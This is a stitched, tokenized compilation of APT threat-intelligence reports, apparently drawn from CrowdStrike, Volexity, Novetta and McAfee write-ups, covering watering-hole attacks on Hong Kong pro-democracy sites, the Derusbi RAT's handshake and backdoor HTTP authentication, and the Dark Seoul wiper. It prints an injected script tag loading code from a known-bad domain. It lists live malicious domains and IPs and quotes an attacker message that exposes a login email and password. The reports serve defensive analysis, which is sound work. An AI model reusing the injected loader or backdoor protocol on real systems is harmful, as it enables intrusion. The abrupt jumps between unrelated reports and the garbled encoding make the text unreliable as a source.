In that operation , the Scanbox code was placed on the website of a U.S .- based think tank and utilized the malicious domain , news [ .
] foundationssl [ .
] com .
The use of the two foundationssl [ .
] com subdomains suggests that the same adversary ( in this case DEEP PANDA ) was responsible for the signed Derusbi malware file and the think tank SWC activity .
Furthermore , CrowdStrike publicly reported on DEEP PANDA targeting of think tanks in July 2014 .
If you want to hear more about DEEP PANDA and their tradecraft or any of the other adversaries that CrowdStrike tracks , please contact : sales @ crowdstrike.com [ 1 ] In February 2014 , CrowdStrike publicly reported on a campaign that leveraged Sakula malware ( http : //www.crowdstrike.com / blog / french - connection - french - aerospace - focused - cve-2014 - 0322-attack- shares - similarities-2012/index.html ) ; however , the Tactics , Techniques , and Procedures ( TTPs ) between that campaign and this recent one are different , suggesting two distinct adversaries are using the Sakula malware .
Posted on October 9 , 2014 by Steven Adair Over the last few months , Volexity has been tracking a particularly remarkable advanced persistent threat ( APT ) operation involving strategic web compromises of websites in Hong Kong and Japan .
In both countries , the compromised websites have been particularly notable for their relevance to current events and the high profile nature of the organizations involved .
In particular the Hong Kong compromises appear to come on the heels of the Occupy Central Campaign shifting into high gear .
These compromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the impacted websites .
This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems .
While investigating these cases , Volexity also discovered additional APT attack campaigns involving multiple other pro - democratic websites in Hong Kong .
These attempts at exploitation , compromise , and digital surveillance are detailed throughout this post .
Warning : Many of these websites may still be compromised and present a risk to visitors .
Browse with caution .
Alliance for True Democracy â€ '' Hong Kong Over the last two days , Volexity has observed malicious code being served up from the website of the Alliance for True Democracy ( ATD ) in Hong Kong ( www.atd.hk ) .
ATD is an alliance of people and organizations dedicated to democracy and universal suffrage in Hong Kong .
At the time of this writing malicious code is still live on the website , so please visit with care until the website is clean .
Below is a screen shot of the malicious code references found pre - pended to a JavaScript file on the website named superfish.js .
This JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and interpeted as : < script language = javascript src = http : //java - se.com / o.js < /script > The domain name java-se.com is known bad and associated with APT activity .
At the time of this post , the domain is hosted on the Japanese IP address 210.253.101.105 .
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC . Volexity has yet to actually see the contents of the file o.js , as the websites has continuously returned HTTP 403 responses each time it was requested .
The file was requested from IP addresses throughout Asia without ever returning valid content .
Itâ€™s unclear if this code is activated at certain times or if there is a whitelist of IPs restricting access to the file to specific targets .
This same code has also been observed being served from another Hong Kong website described in the next section .
While examining the ATD website , Volexity also observed that the site had a password protected backdoor webshell placed on it .
This is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises .
Volexity refers to this shell as the Angel Webshell , named after its default password of â€œangelâ€​ .
The shell will simply display the text â€œPassword : â€​ , a text input box , and a Login button .
A screen shot of the webshell as observed on the ATD website can be seen below .
Despite the shell being written in PHP and only displaying a simple Login prompt , it is easy to identify the Angel webshell based on unique components of its viewable HTML source code .
The HTML source of this page is displayed in the following image .
While Volexity operates under the assumption attackers have placed webshells on webservers they have compromised , in this particular instance it can be seen with certainty .
Attackers will often upload new webshells or add simple China Chopper style modifications to legitimate existing files in an attempt to maintain persistence to these systems .
In the last week , Volexity also observed both the English and Chinese language websites for the Democratic Party Hong Kong compromised with the same malicious code found ont he ATD website ( www.dphk.org | eng.dphk.org ) .
DPHK is a pro - democracy political party in Hong Kong .
Like the ATD website , at the time of this writing the DPHK websites are also serving up malicious code , so please browse with caution .
During our research for this post , we also became aware of multiple public reports related to the compromise of the DPHK website on both Twitter and via ThreatConnect .
Our good friend Claudio Giurianeri posted the following tweet on October 3 , 2014 The website of the Democratic Party of Hong Kong has been compromised and still is .
Let them know .
# OccupyCentral Diving further into some of the replies to this tweet is a plethora of information regarding the exploit domain java-se.com .
In particular , a tweet from Brandon Dixon with relevant data from the PassiveTotal project details several subdomains and IP addresses associated with java-se.com .
While Volexity has only observed a handful of the hostnames in the wild thus far , other active subdomains suggest there could be additional on - going exploit or malware activity from the domain .
Additional reporting on this activity and another going back to August 2014 was also recently shared on ThreatConnect .
Despite all of this attention , the DPHK website is still compromised and references the JavaScript from the hostile domain .
It is also worth noting that this is not the first time that the DPHK website has been used in a strategic web compromise .
Back in May 2011 , Kaspersky Lab reported the website was being leveraged to target users with Flash Exploits .
The DPHK appears to be of high value with respect to targeting visitors .
During the course of investigating activity related to the ATD and DPHK websites , Volexity also observed that the website of the political coalition and pan - democratic organization People Power in Hong Kong ( www.peoplepower.hk ) had been compromised as well .
However , unlike the other two websites , the People Power website did not contain JavaScript modifications pointing to java- se.com .
Instead the website appears to have malicious iFrames leveraging the Chinese URL shortener 985.so .
At the bottom of several of the pages for the People Power website are four iFrames as seen in this screen shot of the website source : Those links , with the exception of the first one , all redirect to exploit pages on the Hong Kong IP address 58.64.178.77 .
These pages load scripts that conduct profiling of the system for various software , plugins , and other related information , as well as load Java exploits designed to install malware on the target system .
If successful , the exploits will install either a 32-bit or 64-bit version of the malware .
Both files are found within the Java Archives files .
Below are details on each of the malware files .
Filename : main.dll File size : 13824 bytes MD5 hash : 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash : 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes : 32-bit version of malware , which beacons to 58.64.178.77:443 .
Filename : main64.dll File size : 15872 bytes MD5 hash : a482a84d13c76b950ce5bc7e75f4edef SHA1 hash : c0a4b9145e0066f5c1534beddc9c666ea8eb0882 Notes : 64-bit version of malware , which beacons to 58.64.178.77:443 .
At the time of this writing , the People Power website is still serving up malicious code .
Volexity recommends avoiding this website and/or browsing with caution .
Volexity believes a separate group of attackers is responsible for this exploit activity and that they are not affiliated with the java-se.com operations .
While digging deeper into pro - democratic websites in Hong Kong , Volexity also discovered peculiar code on the website of a pro- democratic and pro - universal suffrage public policy think thank The Professional Commons ( www.procommons.org.hk ) .
In the case of this website , there is suspicious JavaScript code that writes an iFrame pointing back to a non - existent HTML page on a hotel website in South Korea .
The code from the website can be seen in the screen shot below .
The URL in question points to : hXXp : //www.hotel365.co.kr / Lnk / tw / index.html This link does not work and will redirect a visitor back to the main page of the website .
There does not appear to be any reason for the Professional Commmons website to have a hidden iFrame link randomly placed in the middle of its HTML code .
It is suspected that this was a formerly active exploit URL .
If it is actually malicious , it is possible the code could be re - activated at any time .
Volexity recommend the URL and the Professional Commons website be browsed with caution .
In early September , the APT group behind java-se.com raised its visibility on Volexityâ€™s radar following a compromise that effectively impacted many components of the Japanese Nikkei .
In the first week of September , a subdomain used to load JavaScript code and additional files onto other Nikkei web properties such as www.nikkei.com and asia.nikkei.com was compromised .
In particular a JavaScript file loaded from parts.nikkei.com was modified to reference another JavaScript file from jre76.java-se.com hosted on the Japanese IP address 211.125.81.203 .
7506 | 211.125.80.0/22 | INTERQ | JP | GMO.JP | GMO INTERNET INC .
The code has since been taken down .
However , in early September the JavaScript was pre - pended to the file http : //parts.nikkei.com / parts / SC / s_cDS.js as seen in the screen shot below .
Like the JavaScript from the ATD and DPHK websites , Volexity was never actually able to obtain a live copy of this script .
Each request results in an HTTP 403 response from the server .
Volexity suspects the code was either active at select times and/or was only served to a subset of visitors .
The code has not been observed on the s_cDS.js file for nearly a month now .
While tracking this APT activity , Volexity has also come across other seemingly unrelated compromises of websites in Hong Kong and Japan associated with the java-se.com activity .
Despite several sites being compromised , the above activity tied to java-se.com did not result in the successful capture of actual exploit code or malware .
However , research into other websites and activity involving java-se.com did lead Volexity to live exploits and malware .
In particular Volexity came across live exploit code hosted at jdk-7u12-windows-i586.java-se.com on the Japanese IP address 210.253.96.200 .
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC .
This system hosted a JavaScript file , which in turned loads a malicious Java Applet .
In testing the the Java Applet pops up a notification to the user asking them if they want to run the applet .
Volexity has not had enough time to thoroughly analyze the file to see if it is an actual exploit or if the attackers rely on user assisted malware installation .
The pop - up does make it appear as if the file is an update to Java .
The popup displayed by Java is displayed below .
As can be seen in the image above , this popup could be misconstrued by a user as an update to Java despite the java-se.com domain and the Publisher being listed as WindySoft .
Interestingly the Java Archive being loaded is digitally signed by a certificate issued to WindySoft , an online gaming company from South Korea .
We can not confirm this certificate actually belonged to WindySoft at any point in time , however , there is fairly established precedent of certificates from online gaming companies being used to digitally sign malware and attack tools .
As one might expect , choosing to press the Run button would be bad news for someone presented with this prompt .
If one were to click Run from this prompt , it would result in the file css.jpg being download over an encrypted channel from a folder on https : //elsa - jp.jp .
Note that elsa-jp.jp is a website hosted on the same IP address jdk-7u12-windows-i586.java-se.com and is likely compromised .
The file css.jpg is of course not a JPEG file , it is an executable that has been encoded with the single - byte XOR key 0xFF .
Filename : css.jpg File size : 168776 bytes MD5 hash : b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash : 394703d1240ccd3aaeeef50c212313e3036741b1 Notes : Executable file downloaded by Java Applet that has been encoded with XOR 0Ã-99 Taking a closer look at the resulting executable we have , it turns out it is a newer sample of PlugX .
In this particular sample an interesting and notable string was observed : C : \wocawocawoca\piao\Release\caca.pdb Also of interest is that as observed from the Java Applet , the executable is also digitally signed by a certificate issued to â € œWindySoft.â€​ Upon execution the malware sample immediately does a DNS resolution for the following hostname : jduhf873jdu7.blog.163.com The PlugX sample connects to the blog and parses the page for a command for where to connect to next .
This is very similar to the method described by FireEye in their blog on Operation Poisoned Hurricane .
The primary difference being that the attackers opted to use a 163.com Blog over a Google Code page to embed the command .
Taking a closer look at the Blog page the following post is observed : The primary string to focus on is in the title of the post : DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS Using the same decoding routine describe by Cassidian in a PlugX post of theirs from earlier this year , we can see this command decodes to instruct the malware to connect to a U.S .- based Linode IP address at Hurricane Electric : 173.255.217.77 .
6939 | 173.255.208.0/20 | HURRICANE | US | LINODE.COM | LINODE A look at passive DNS identifies several hostnames that recently resolved to the IP address .
The ones that still resolve to the IP are listed below : dns.apasms.com ns.gpass1.org ns1.gpass1.org These hostnames may be related but at the time of this writing we have not seen them in use in malware and are unable to confirm .
As we have seen for several years now , dissenting groups , especially those seeking increased levels of freedom frequently find themselves targeted for surveillance and information extraction .
In the digital age , a strategic web compromise ( exploit drive - by ) has become a key weapon of choice for to conduct such operations .
These types of attacks are far from overt , as a typical target and victim opted to go on their own to what they believe should be a safe and trusted website .
In the case of this post , it appears that at least two different attackers were involved in compromising and placing malicious code on Pro - Democratic websites in Hong Kong .
This is not the first time and surely will not be the last time that those in favor of democracy in Hong Kong will be targeted .
Unfortunately with the level of access and infrastructure the attackers appear to have , this is quite an uphill battle .
Continuing to expose these attack is one means that shines light on these attack operations with an aim at putting a dent in their success .
There are two types of Derusbi malware : a client - server model and a server - client model .
Both types provide basic RAT functionality with the distinction between the two being largely the directionality of the communication .
This report will focus on the server - client variant ( or simply , the `` server variant '' ) of Derusbi , which acts as a server on a victim 's machine and waits for commands from a controlling client .
In and of itself , the Derusbi server variant is a largely unremarkable RAT when viewed from the perspective of functional capabilities .
The server variant supports basic RAT functionality such as file management ( uploading and downloading ) , network tunneling and remote command shell .
What makes the server variant interesting is the device driver that the variant installs .
The server variant utilizes a device driver in order to hook into the Windows firewall by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later .
The driver , after hooking the firewall using either of the two mentioned interfaces , will inspect incoming network packets .
If a specific handshake occurs between the client and the server variant , the remainder of the communication session for the established session will be redirected to the server variant .
If the driver does not detect the appropriate handshake , then the network traffic is allowed to pass unobstructed .
This allows an attacker to hide their communication within a cluster of network sessions originating from a single IP such as would be the case for a client performing multiple HTTP requests against a web server .
The server variant runs as a svchost dependent service .
While the server variant binary does have exports related to the standard service DLL ( e.g .
ServiceMain , DllRegisterService , etc .
) , the startup sequence truly begins in the DllEntryPoint function .
When loaded into memory via a LoadLibrary or equivalent function call , the server variant will determine the name of the host binary ( presumably svchost.exe ) as well as its own DLL 's name .
The binary then spawns a new thread that contains the main server variant code in order to allow the DllEntryPoint routine to return to the calling function .
Within the main server variant function ( dubbed mainThread ) , the server variant loads a pointer to the API function GetCommandLineW , locates the pointer in memory to the command line string , and then locates the first space within the command line string and terminates the string by placing a NULL character at the location .
The server variant then attempts to determine if it has suitable access rights within the system in order to operation .
The check for access rights effectively checks to see if the server variant process is running under the NT Authority .
If the check is unsuccessful , then the server variant terminates .
With the command line patched and authority verified , the server variant sleeps for 5 seconds before verifying that the fShutdown flag is not set .
The fShutdown flag can become set by the process loading the server variant calling the DllRegisterServer export .
The DllRegisterServer function , among other tasks , will attempt to install the server variant as a server on the victim 's machine .
Therefore , by waiting 5 seconds before continuing the mainThread functionality , the server variant is giving the DllRegisterServer time to activate and perform the necessary operations to ensure that the server variant is properly installed and activated as a service .
The mainThread calls the mainLoop function of the server variant .
The mainLoop function begins by loading the unique infection ID for the victim 's machine from the registry ( under the key value located at HKLM\SOFTWARE\Microsoft\Rpc\Security ) .
The infection ID , if present , must be decoded by XOR'ing each byte of the string with a static byte value ( typically 0x5F ) .
If the infection ID does not exist within the registry , the server variant will attempt to load the configuration from an encoded buffer located immediately after the static string XXXXXXXXXXXXXXX , decode the buffer by starting at the last byte and XORing each previous byte by the current byte value in reverse order ; the server variant will then use a specific portion of the configuration blob as the infection ID 's base .
Next , the server variant will append a hyphen and a four digit value to the end of the infection ID to generate the unique infection ID for the victim 's machine .
The newly generated infection ID is then saved to the registry location stated previously .
The mainLoop attempts to get the privileges for SeDebugPrivilege , SeLoadDriverPrivilege , SeShutdownPrivilege , and SeTcbPrivilege in order to perform the necessary operations to load the driver portion of the server variant .
The mainLoop will attempt to open a handle to the driver ( if it is already installed ) by calling CreateFile with the filename of \Device\ { 93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F } .
Failing this , the mainLoop determines if the victim 's machine is running the 360 antivirus product by looking for a process with the name ZhuDongFangYu.exe .
If the process is running , the driver is not installed but the mainLoop continues regardless .
If the process is not found , however , the mainLoop will extract the driver binary from an encoded buffer within itself , decode the file in memory ( using a rotating 4-byte XOR key ) , and install the driver on the victim 's machine as % SYSDIR % \Drivers\ { 93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F } .sys
.
With the driver present ( or recently installed ) , the mainLoop spawns another thread ( dubbed DerusbiThread : : DerusbiThread ) that acts as the primary communication loop .
DerusbiThread : : DerusbiThread begins by generating a PCC_SOCK object .
PCC_SOCK is an abstraction for the communication subsystem .
The prototype for PCC_SOCK appears in Figure 1 .
With a new PCC_SOCK object allocates , DerusbiThread : : DerusbiThread selects a port between 40,000 and 45,000 to use as a listening port .
The port number is sent to the driver ( via IOCTL 0x220200 ) in order to inform the driver where to redirect incoming traffic .
The `` Windows Device Driver ( Firewall Hook ) '' section explains the functionality of the driver in greater detail .
DerusbiThread : : DerusbiThread binds to the specified port and opens the port as a listener .
At this point DerusbiThread : : DerusbiThread enters an infinite loop of waiting for new connections to the listening socket and dispatching a new thread ( dubbed CommLoop ) to handle the traffic for the socket until fShutdown is set .
At this point , the startup sequence for Derusbi is complete and the server variant moves into a communication and command dispatch phase .
The communication between the controlling client and the Derusbi server variant depends on the device driver being in place .
The authors of the device driver designed the driver to work on Windows 2000 and later versions of the Windows operating system .
Depending on the version of the victim 's OS , the driver will hook the Windows Firewall by either using the surprisingly undocumented IOCTL_IP_SET_FIREWALL_HOOK command of the \\Device\IP device for Windows XP or older machines or by using the documented Windows Filtering Platform ( WFP ) found in Windows Vista and later .
The device driver inspects incoming network traffic from any client connecting to the victim machine , determines if an appropriate handshake packet occurs at the beginning of a new TCP session , and then makes the decision to reroute the network traffic to the Derusbi malware or let the traffic continue unaltered to its original service .
Once a session has been established by means of a valid handshake , any subsequent packets from the client for the given TCP session will automatically be directed by the device driver to the Derusbi server variant .
The device driver does not capture or store any network traffic outside of the initial handshake inspection .
The Derusbi server variant will select an available , random port between the range of 40,000 and 45,000 on the victim 's machine upon which to listen .
After selecting the port , the server variant will wait for incoming connections and instruct the driver to redirect appropriate TCP sessions to the listening port .
In order to establish a valid communication channel between the server variant and a controlling client , a specific handshake is required .
The handshake between a client and the server variant is well defined and consisting of 64 bytes , the data within the handshake is entirely random with the exception of the 3rd and 8th DWORD .
The handshake begins when the client sends a 64 byte random buffer with the 3rd ( offset 12 ) and 8th ( offset 32 ) DWORDs defined as : The server will acknowledge the handshake by sending a 64 byte random buffer with the same pattern for the 3rd and 8th DWORDs based on the new , randomly generated 1st DWORD ( offset 0 ) .
It is the client 's handshake that the driver for the server variant triggers off of .
Some older versions of the server variant use a different set of DWORDs to validate the handshake , also the tests are the same .
These other versions have been observed to use the following DWORDs : If the handshake fails , the server variant provides a secondary means to authenticate a client .
Presumably a failsafe if the driver is unable to load , the secondary method requires the client to send a POST request with the following form : POST /forum / login.cgi HTTP/1.1\r\n In addition , the POST request must contain a Via field .
If the request and the Via field exist , the server variant authenticates the client and responds with HTTP/1.0 200 Server : Apache/2.2.3 ( Red Hat ) Accept - Ranges : bytes Content - Type : text / html Proxy - Connection : keep - alive If the client 's request does not meet the appropriate authentication criteria , the server variant sends : HTTP/1.0 400 Bad Request Server : Apache/2.2.3 ( Red Hat ) Connection : close With a communication channel between the server variant and the client established , the server sends information about the victim 's computer .
Consisting of a 180 byte data structure ( Figure 3 ) , the server variant provides the client with a variety of details about the victim 's machine .
The VictimInfoPacket has an identifier of 2 ( see the dwPktType explanation below ) .
The communication between the server and the client at this point , and for the remainder of the session , is encrypted .
Communication between the client and the server variant exists in the form of a sequence of encrypted datagrams .
Each datagram consists of a 24 byte header followed by an optional payload section .
The header is not encrypted but if the optional payload is attached , the payload is encrypted using a DWORD XOR .
The format of the header is as follows : The dwTotalPacketSize field defines the total size of the datagram including both the size of the header and the size of the optional payload .
The dwPktType field correlates to the module ID which allows the server variant to route the datagram to the appropriate module without further inspection of the payload data .
The dwChecksum value is sum of all of the bytes within the optional header ( the field is ignored , but present , if there is no payload section ) .
The dwEncryptionKey is the 32-bit XOR encryption key for the payload section .
If the fCompressedPayload field is non - zero , then the data within the payload is compressed using LZO compression ( prior to XOR encoding ) and the dwDecompressedSize field represents the final size of the payload data after decompression .
The payload section can have up to three different presentations depending on if compression is used .
The first presentation is the original payload data as generated by the client or server , the second presentation is the LZO compressed form , and the final presentation ( the presentation that exists going across the network ) is the 32-bit XOR encoded data blob .
Figure 4 provides a graphical representation of the presentation types of the payload section .
After sending the server information via the VictimInfoPacket , the server variant spins off a CommLoop thread for the connection and returns to waiting for new connections from clients to appear .
The CommLoop thread begins by establishing the set of internal command handlers available to the server variant .
With the exception of the administrative command handler ( which is built into the CommLoop ) , each of the internal commands consists of an object derived from a base object PCC_BASEMOD .
The server variant appears to have a modular design allowing an attacker to compile only the components that are necessary for any given operation .
The malware supports up to 8 different modules per sample with each module designating its own ID code .
Novetta has observed the following modules : Given the spacing in ID numbers ( as noted in the gap between 0x82 and 0x84 in an otherwise sequential ID scheme ) , it is conceivable that additional modules exist .
After establishing the tools , an infinite loop ( CommLoop ) is entered in which the server variant will wait for up to 1/100 of a second for input from the network ; if such input arrives , the server routes the packet to the appropriate handler .
If the network input does not arrive , the CommLoop queries each of the command handlers for any packets they may have queued ( by calling each command handler 's ReadWaitingData function ) and transmits the packets the handlers have generated .
Additionally , if more than 60 seconds passes between network inputs from the client or network outputs from the server variant , the CommLoop will send out a beacon packet ( dwPktType = 4 ) .
CommLoop routes packets to the appropriate command handler object by locating the dwPacketIdentifierCode within each of the registered command handlers that matches the incoming packets dwPktType .
When the appropriate command handler is found , CommLoop passes the payload of portion of the packet to the command handler 's ProcessPacket function .
The PCC_CMD object contains the remote shell functionality of the server variant along with the ability to execute arbitrary programs .
Derived from the PCC_BASEMOD class , the PCC_CMD class 's operations are focused largely in the ProcessPacket and ReadWaitingData functions .
The PCC_CMD : : ProcessPacket function works as a stub function that merely passes the packet 's payload data ( pkt ) data to PCC_CMD : : ProcessPacketEx while ignoring the dwPktSize parameter .
The packet 's payload data is , in and of itself , another datagram with a header and optional payload section .
The payload of each PCC_CMD destined packet contains the following header : The dwCommandType field specifies the specific PCC_CMD command that the client is requesting the server variant perform .
There are four commands that PCC_CMD supports : For each of the commands , any output from or acknowledgement of the commands comes in the form of another packet consisting of a PacketHeader followed by a PCCCMDPacketHeader and any optional payload data .
The dwCommandType of the newly constructed packet matches the command 's original dwCommandType value ( e.g .
responses from 0x04 commands will reply with dwCommandType set to 0x04 ) .
PCC_CMD : : ProcessPacketEx will queue the response packets in an internal buffer .
The PCC_CMD : : ReadWaitingData member function is responsible for transmitting any of the previously queued packets from PCC_CMD : : ProcessPacketEx .
If there are no queued packets , PCC_CMD : : ReadWaitingData will perform a queue of the console output pipe for the remote shell process ( if it is active ) ; the function will also attempt to read the entirety of the waiting data , which then becomes the payload of a PacketHeader / PCCCMDPacketHeader based packet with the dwCommandType set to 0x0C .
If the read is unsuccessful , the function returns a PacketHeader / PCCCMDPacketHeader based packet with the dwCommandType set to 0x10 indicating an error and terminating the remote shell session .
The PCC_FILE object provides a large range of file system administration functions .
PCC_FILE is derived from the PCC_BASEMOD class meaning that the processing of commands should be contained within the PCC_FILE : : ProcessPacket member function with some additional processing done in the PCC_FILE : : ReadWaitingData member function .
This is not necessarily the case , however .
The PCC_FILE : : ProcessPacket member function , much like PCC_CMD : : ProcessPacket , is little more than a stub function that passes only a copy of the payload data ( pkt ) to PCC_FILE : : ProcessPacketEx .
PCC_FILE : : ProcessPacketEx performs no file management operations but instead adds any incoming command packets to a queue for processing by PCC_FILE : : ReadWaitingData if the packet is not already within the queue ( thus avoiding duplication of commands ) .
The PCC_FILE : : ReadWaitingData member function is a stub function that calls PCC_FILE : : ProcessQueue and returns the resulting packet from the queue processing .
This means that file operations are surprisingly low priority , and potentially , high latency operations .
Each packet that arrives within the packet queue of PCC_FILE contains a standard header followed by a ( quasi - optional ) payload data blob .
The header for the PCC_FILE command packets takes the following form : The dwCommandType field specifies the specific PCC_FILE command that the client is requesting the server variant to perform .
PCC_FILE supports 17 ( of which 15 are unique ) commands .
While the general form within the Derusbi server variant communication model is to return a packet with the same dwCommandType as the original command , many of the PCC_FILE commands return a status packet type ( dwCommandType = 0x04 ) .
Commands 0x2C , 0x44 , and 0x48 all appear to be the exact same base command with only slight variations in their response format .
It is unclear why this particular command is included three times in PCC_FILE .
The PCC_PROXY object provides the platform for a tunneling network traffic to and from the client to a specific endpoint ( or endpoints if multiple tunnels are activated by the client ) .
Derived on the PCC_BASEMOD class , the PCC_PROXY class performs very little network tunneling within the CommLoop interactive PCC_PROXY : : ProcessPacket and PCC_PROXY : : ReadWaitingData member functions .
The PCC_PROXY : : ProcessPacket member function queues incoming PCC_PROXY packets into a received queue while PCC_PROXY : : ReadWaitingData returns packets from a transmit queue , with the directionality from the perspective of the server variant .
The core of the PCC_PROXY 's network tunneling comes from a spawned processing thread ( PCC_PROXY : : MainThread ) that is generated when the PCC_PROXY object is instantiated .
The PCC_PROXY : : MainThread function consist an infinite loop that only terminates when the PCC_PROXY : : fShutdown flag is set .
Otherwise , the loop will inspect another internal flag ( PCC_PROXY : : fNetworkEnabled ) to determine if the network tunneling is currently active .
If the PCC_PROXY : : fNetworkEnabled flag is set to false , then tunneling is disabled but command processing continues .
It is possible to have more than one tunnel active at any given time .
In order to firewall tunnels from each other over the backbone of the server variant 's command channel , each tunnel is assigned a specific channel identifier .
This allows the client to specify which specific tunnel data is transmitted to as well as telling the client which tunnel is returning data .
If the PCC_PROXY : : fNetworkEnabled flag is set to true , PRC_PROXY : : MainThread will loop through all active channels , perform a select on the socket connected to the endpoint and -- if the select indicates that there is data waiting on a particular socket -- the data is read .
A new PCC_PROXY based packet is then generated and the packet is queued for delivery to the client .
After processing each of the channels for new data , PCC_PROXY : : MainThread processes incoming command packets from the client ( an operation usually handled by the PCC_BASEMOD : : ProcessPacket function ) .
Packets belonging to the PCC_PROXY subsystem have a common header , much like the other PCC_BASEMOD derived classes .
To this end , the PCC_PROXY packets have the same packet header as the PCCFilePacketHeader packet header .
The PCC_PROXY supports five commands : The administrative commands are built - in to the server variant and are not derived from the PCC_BASEMOD class .
Each of the administrative command packets contains the same header structure as the PCCFilePacketHeader structure followed by an optional payload data blob .
The administrative commands consist of the following five commands : Given the encrypted , and potentially compressed , nature of Derusbi server variant network traffic , detecting the traffic on a network can be problematic using traditional IDS signatures .
South Korea was hit by a major cyberattack on March 20 , 2013 , at 2:00 pm local time .
This cyberattack caused a significant amount of damage to the affected organizations by wiping the hard drives of tens of thousands of computers .
McAfee Labs research provides further insight into the likely source of these attacks .
Though not definitive , our analysis provides a much clearer picture .
The research also indicates that there may have been two distinct groups , attacking different targets .
Our analysis of this attack - known first as Dark Seoul and now as Operation Troy - has revealed that in addition to the data losses of the MBR wiping , the incident was more than cybervandalism .
The attacks on South Korean targets were actually the conclusion of a covert espionage campaign .
Our analysis suggests the following order of these attacks .
Later in this report we mention other elements that color our view of this event , but consistent throughout is our belief that the attackers had access to the environments prior to launching the wiping component .
March 20 attack against banks and news agencies in South Korea : 1 .
The remote - access Trojan was compiled January 26 , 2013 .
2 .
The component to wipe the master boot record ( MBR ) of numerous systems was compiled January 31 .
3 .
An initial victim within the organization was spear - phished with the remote - access Trojan .
This likely occurred before March 20 , and possibly weeks prior to the attack .
4 .
The dropper was compiled March 20 , hours before the attack occurred .
5 .
The dropper was distributed to systems across the victim organizations , and within minutes of execution the MBRs were wiped .
This occurred around 2:00 pm Seoul time on March 20 . Who conducted these attacks is still unclear , but our research gives some further insight into the likely source .
The clues left behind confirm that the two groups claiming responsibility were a fabrication to throw investigators off the trail and to mask the true source .
The two groups that appear to have been involved in the attacks have had no prior connection until now .
• NewRomanic Cyber Army Team .
The samples connected to this group are more convincing .
The majority of the wipers ( found in the wild and retrieved from infected systems through other sources ) contain the strings `` principes '' and `` hastati , '' which also appear in a message left on one of the targeted websites in the form of a web pop - up .
The wiper component also overwrote the MBR with one of these strings .
The following data points support this fact : ––The strings `` principes '' and `` hastati '' were found within the code of some of the wiper components .
The same strings were also found in the web pop - up message that was left on the Nocut News Korea website .
The strings are ancient Roman terms that make reference to military units , hence a `` cyberarmy .
'' The pop - up even states some of the specific units that were part of hastati which were involved in this attack .
––The remote - access Trojan that was found had a build path which included the reference `` Make Troy , '' a subdirectory of the folder `` Work .
'' Troy refers to an ancient Roman region , again connecting the Roman references to this group , which consistently uses this theme .
• The Whois Hacking Team .
On March 20 , the website of the network provider LG + U was defaced by this group .
Was it a coincidence that a second group was involved ? All of the evidence indicates that they had a strong involvement , but there is no solid link to the group because it did not claim involvement in the attacks .
However , we do have the circumstantial link of a wiper component that in practice operated differently from the wipers employed by the NewRomanic Cyber Army yet also appears to be essentially the same wiper .
The Whois Hacking Team MBR wiper component includes the same graphics ( in a resource file in the binary ) that appeared on the defaced LG + U website , although the malware did not behave the same way .
Within the main executable file , however , we discovered a small portion of the code that matched the structure of that of the NewRomanic Cyber Army wipers we found , so the Whois Team likely dropped the same wiper .
State sponsored or not , these attacks were crippling nonetheless .
The overall tactics were not that sophisticated in comparison to what we have seen before .
The trend seems to be moving toward using the following techniques against targets : • Stealing and holding data hostage and announcing the theft .
Public news media have reported only that tens of thousands of computers had their MBRs wiped by the malware .
But there is more to this story : The main group behind the attack claims that a vast amount of personal information has been stolen .
This type of tactic is consistent with Anonymous operations and others that fall within the hacktivist category , in which they announce and leak portions of confidential information .
• Wiping the MBR to render systems unusable , creating an instant slowdown to operations within the target What were the motives behind these attacks and why did the attackers chose certain targets ? The attacks managed to create a significant disruption of ATM networks while denying access to funds .
This was n't the first time that this type of attack - in which destructive malware wiped the systems belonging to a financial institution - has occurred in South Korea .
In 2011 the same financial institution was hit with destructive malware that caused a denial of service .
The attackers left a calling card a day after the attacks in the form of a web pop - up message claiming that the NewRomanic Cyber Army Team was responsible and had leaked private information from several banks and media companies .
They also referenced destroying the data on a large number of machines ( the MBR wiping ) and left a message in the web pop - up identifying the group behind the attacks .
The page title in Internet Explorer was `` Hey , Everybody in Korea ? ? ? ? '' `` Hi , Dear Friends , We are very happy to inform you the following news .
We , NewRomanic Cyber Army Team , verified our # OPFuckKorea2003 .
We have now a great deal of personal information in our hands .
Those includes ; 2.49 M of member table data , cms_info more than 50 M from .
Much information from Bank .
We destroyed more than 0.18 M of PCs .
Many auth Hope you are lucky .
11th , 12th , 13th , 21st , 23rd and 27th HASTATI Detachment .
Part of PRINCIPES Elements .
p.s For more information , please visit www.dropbox.com login with joseph.r.ulatoski @ gmail.com : : lqaz @ WSX3edc $ RFV .
Please also visit pastebin.com .
'' A few types of malware were involved in these attacks .
Each variant had a particular use .
Some public reports mentioned only the use of the wiper component ; however , there were actually three components , all with a different purpose , that assisted the attackers in the campaign .
There were two subsequent aspects to this attack : • The destruction of PCs using the MBR wiper component .
Occurred March 20 .
• Remote access to the targets ' environments for a period prior to the attack .
The duration of this access is unknown .
The dropper Trojan was primarily used to download the executable that destroyed the systems ' MBRs .
We suspect that the dropper Trojan was distributed at the time of the attacks via a compromised patch - management server that pretended to run a legitimate update .
The dropper Trojan was compiled March 20 , the day of the attack and several hours prior to the destruction of the systems .
We suspect that the attackers had access to the target environment prior to March 20 .
It is unlikely that a large volume of users ( some 30,000 + ) were spear - phished on March 20 alone .
It 's likely a much earlier compromise led to the attacks ' being staged internally .
Thus , there was an initial victim whose infected system allowed the attackers to gain access to other systems that let them distribute the malware broadly .
The initial infection certainly could have come from a spear - phishing attack .
The backdoor component was compiled in late January .
The attackers could have been inside the networks since February .
This timeline is plausible given that the attackers claim to have stolen a vast amount of information from these networks prior to wiping the MBRs .
